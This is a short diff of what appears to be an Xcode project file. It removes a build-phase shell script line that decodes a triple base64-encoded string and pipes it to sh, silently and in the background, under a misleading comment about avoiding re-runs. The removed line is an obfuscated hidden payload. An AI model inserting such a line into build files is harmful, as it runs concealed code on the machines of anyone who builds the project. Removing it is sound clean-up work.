@@ -314,7 +314,6 @@
 			outputPaths = (
 			);
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhRnBIT1dsYVYwNXJZbWsxZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 			showEnvVarsInLog = 0;			
 		};
 		3399D490228B24CF009A79C7 /* ShellScript */ = {
